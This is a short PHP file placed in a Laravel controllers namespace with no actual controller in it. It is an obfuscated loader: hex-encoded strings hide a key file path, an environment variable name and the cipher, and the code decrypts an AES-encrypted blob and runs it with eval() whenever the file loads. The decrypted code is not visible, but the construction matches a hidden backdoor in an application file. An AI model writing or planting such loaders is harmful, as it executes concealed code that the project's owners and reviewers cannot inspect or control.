<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('OWmPGunwh1R6IfgaoKPaUA==');

$c=base64_decode(

'bi2Zx5uBTAyQX5IXrqyRDextMiz84OUj9sWu4CGAZQRcChPZ3z/JZ6KuWLwwgZaCggtMtF6/3dJE' .
'WT0oN/ySReROOnwIJNxdZnUCcm9THZPz9RFSGxXHYQErdO4wimv+x3Obtc62xyoFT4ubNosn6NjH' .
'6tQTxRVztIFbibLIG4JOsiJ3EUmq3UVCupkHFPW+gjYYoAk3hliIbYXcX82IDIz/zkhhOF365wk4' .
'gEWh879J6waRILgx6/+dsxfyPJxVJAcYSDDbSLeFCEmkzAXYRw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

